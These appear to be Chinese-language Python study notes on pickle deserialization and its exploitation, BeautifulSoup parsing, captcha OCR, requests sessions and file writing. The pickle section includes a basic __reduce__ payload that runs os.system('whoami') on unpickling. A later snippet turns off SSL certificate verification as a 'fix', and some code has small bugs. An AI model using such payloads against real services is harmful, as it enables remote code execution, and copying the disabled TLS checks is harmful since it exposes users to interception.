



## pickle反序列化

**能够被序列化的对象**

-   `None`、`True` 和 `False`
-   整数、浮点数、复数
-   `str`、`byte`、`bytearray`
-   只包含可打包对象的集合，包括 tuple、list、set 和 dict
-   定义在模块顶层的函数（使用 [`def`](https://docs.python.org/zh-cn/3.7/reference/compound_stmts.html#def) 定义，[`lambda`](https://docs.python.org/zh-cn/3.7/reference/expressions.html#lambda) 函数则不可以）
-   定义在模块顶层的内置函数
-   定义在模块顶层的类
-   某些类实例，这些类的 [`__dict__`](https://docs.python.org/zh-cn/3.7/library/stdtypes.html#object.__dict__) 属性值或 [`__getstate__()`](https://docs.python.org/zh-cn/3.7/library/pickle.html#object.__getstate__) 函数的返回值可以被打包（详情参阅 [打包类实例](https://docs.python.org/zh-cn/3.7/library/pickle.html#pickle-inst) 这一段）

**对于不能序列化的类型，如lambda函数，使用pickle模块时则会抛出 [`PicklingError`](https://docs.python.org/zh-cn/3.7/library/pickle.html#pickle.PicklingError) 异常。**

>   **Python使用pickle进行序列化和反序列化，然后发现面临的一个获取不到返回值的框架，**
>
>   **似乎可以通过在框架中先序列化，然后在外部进行反序列化的方法来实现**

**主要方法**

```nginx
dump	对象反序列化到文件对象并存入文件
dumps	对象反序列化为 bytes 对象
load	对象反序列化并从文件中读取数据
loads	从 bytes 对象反序列化
```

```nginx
pickle.dump(obj, file, protocol=None, *, fix_imports=True)
	# obj：将 Python 对象 obj 序列化并写入文件对象 file 中
	# protocol：指定序列化协议的版本号，不写默认最高，可填0-5
	# fix_imports：用于控制是否自动修复导入的模块和类名

pickle.dumps(obj, protocol=None, *, fix_imports=True)
	# 将 obj 封存以后的对象作为 bytes 类型直接返回，而不是将其写入到文件
```

**正常序列化案例**

```nginx
import pickle
 
class Person():
    def __init__(self):
        self.age=18
        self.name="Pickle"
 
p=Person()
opcode=pickle.dumps(p)
print(opcode)
#结果如下
#b'\x80\x04\x957\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x06Person\x94\x93\x94)\x81\x94}\x94(\x8c\x03age\x94K\x12\x8c\x04name\x94\x8c\x06Pickle\x94ub.'
 
 
P=pickle.loads(opcode)
print('The age is:'+str(P.age),'The name is:'+P.name)
#结果如下
#The age is:18 The name is:Pickle
```

****

**本地的序列化与反序列化案例**

```py
import pickle

# 定义一个序列化的对象
class BeSerializing:
    # 初始化变量
    def __init__(self):
        self.var = "这是参数的内容"

    def print_var(self):
        print(f"self var value is:{self.var}")

# 进行序列化
class Serializing:
    def do_serializing(self):
        obj = BeSerializing()
        # with的好处是会最后自动释放获取的资源，对于文件就是最后会自己close()
        # 使用 open 函数打开一个文件句柄 file_handler，以二进制写入模式 "wb"。
        with open("test_pickle.obj", "wb") as file_handler:
            # 序列化，将对象写到文件
            pickle.dump(obj, file_handler)	 # 序列化并将 obj 对象写入文件

# 进行反序列化
class DeSerializing:
    def do_serializing(self):
        with open("test_pickle.obj", "rb") as file_handler:
            # 反序列化，将对象从文件中还原
            # 注意，虽然python的变量不需要使用前先定义类型，但使用时是要被格式化成确定类型的
            # 所以，如果反序列化类和被序列化类不在同一文件中，那么需要将被序列化类import进来，不然会因找不到被反序列化类而反序列化失败
            obj = pickle.load(file_handler)
            print(f"对象类型: {type(obj)}\n"
                  f"参数值: {obj.var}")


if __name__ == "__main__":
  	obj_se = Serializing()  # 创建 Serializing 类的实例对象 obj_se
    obj_se.do_serializing()  # 调用 do_serializing 方法进行序列化操作
    obj_de = DeSerializing()  # 创建 DeSerializing 类的实例对象 obj_de
    obj_de.do_serializing()  # 调用 do_serializing 方法进行反序列化操作
    
```

**网络的序列化与反序列化案例**

>   **上一个是以文件作为中介实现序列化与反序列化的**，
>
>   但如果到**网络中就没有文件作为中介**。
>
>   此时可以使用`pickle.dumps()`和`pickle.loads()`**进行序列化与反序列化。**

```py
import binascii
import pickle

# 需要序列化的对象
class BeSerializing:
    def __init__(self):
        self.var = "a test string."

    def print_var(self):
        print(f"self var value is:{self.var}")

# 序列化
class NoFileSerializing:
    def do_serializing(self):
        be = BeSerializing()
        
        # 二进制直接decode可能很多位置没法解码（codec can't decode）
        obj_bytes = pickle.dumps(be)
        # 所以先转成ascii码形式的16进制再decode
        str = binascii.b2a_hex(obj_bytes).decode(encoding="ascii")

        # 模拟网络远端获取传过来的字符串
        net_str = str
        # 还原成二进制
        net_bytes = binascii.a2b_hex(net_str.encode(encoding="ascii"))
        # 反序列化
        obj_str = pickle.loads(net_bytes)
        print(obj_dst.var)	# 输出：a test string.

if __name__ == "__main__":
    obj_nf = NoFileSerializing()
    obj_nf.do_serializing()
```

### 漏洞常见出现地方

1.  通常在解析认证`token`, `session`的时候，现在很多`Web`服务都使用`redis`、`mongodb`、`memcached`等来存储`session`等状态信息.
2.  可能将对象`Pickle`后存储成磁盘文件
3.  可能将对象`Pickle`后在网络中传输

### 漏洞利用方式

>   **漏洞产生的原因在于其可以将自定义的类进行序列化和反序列化,** 
>
>   **反序列化后产生的对象会在结束时触发`__reduce__()`函数从而触发恶意代码**.
>
>   ==`__reduce__`方法会在反序列化时固定调用==

**基本payload**

```nginx
import pickle
import os

class Person():
    def __init__(self):
        self.age = 18
        self.name = "Pickle"

    # 该函数能够定义该类的二进制字节流被反序列化时进行的操作，
    # 返回值是一个(callable, ([para1,para2...])[,...])类型的元组
    # 当字节流被反序列化时，Python就会执行callable(para1,para2...)函数
    def __reduce__(self):
        # 因此当上述的Person对象被unpickling时，就会执行os.system(command)，
        command = r"whoami"
        return os.system, (command,)


p = Person()
opcode = pickle.dumps(p)
print(opcode)

P = pickle.loads(opcode)
print('The age is:' + str(P.age), 'The name is:' + P.name)

```







## BeautifulSoup库使用

>   BeautifulSoup库是Python中一个非常流行的HTML和XML解析库。
>
>   它可以从HTML或XML文档中提取数据，使得数据提取更加方便快捷

**假设我们有一个包含以下HTML代码的文件`example.html`**

```xml
<!DOCTYPE html>
<html>
<head>
	<title>Example Page</title>
</head>
<body>
	<h1>Welcome to my website!</h1>
	<p>Here is some information about me:</p>
	<ul>
		<li>Name: John Smith</li>
		<li>Age: 30</li>
		<li>Occupation: Web Developer</li>
	</ul>
</body>
</html>
```

**我们可以使用如下代码来解析这个HTML文件**

```py
from bs4 import BeautifulSoup

# 读取HTML文件内容
with open('example.html', 'r') as file:
    html = file.read()

# 解析HTML文件内容
soup = BeautifulSoup(html, 'html.parser')

# 获取页面标题
title = soup.title.string

# 获取页面主体内容
body = soup.body

# 获取姓名、年龄和职业信息
name = soup.find('li', text='Name:').string.split(':')[1].strip()
age = soup.find('li', text='Age:').string.split(':')[1].strip()
occupation = soup.find('li', text='Occupation:').string.split(':')[1].strip()

# 输出结果
print('Title:', title)
print('Name:', name)
print('Age:', age)
print('Occupation:', occupation)
# 输出结果为:
# Title: Example Page
# Name: John Smith
Age: 30
Occupation: Web Developer

```



## 证书验证解决

**（同时适用urlopen和urlretrieve函数）：**

```python
import ssl
ssl._create_default_https_context = ssl._create_unverified_context
```

**（适用于urlopen函数,因为urlretrieve没有context参数所以不适用）：**

```python
import ssl
context = ssl._create_unverified_context()
response = urlopen(json_url, context=context)
```

## 获取验证码

```python
import ddddocr

ocr = ddddocr.DdddOcr()
with open('1.png', 'rb') as f:
    img_bytes = f.read()
res = ocr.classification(img_bytes)

print(res)
```

## 会话维持

```python
s=requests.Session()
s.get('http://httpbin.org/cookies/set/number/123456789')
r=s.get('http://httpbin.org/cookies')
print(r.text)

```

## 写入文件

**多行写入（如html）**

```python
data = ['a','b','c']
#单层列表写入文件
with open("data.txt","w") as f:
    f.writelines(data)
```



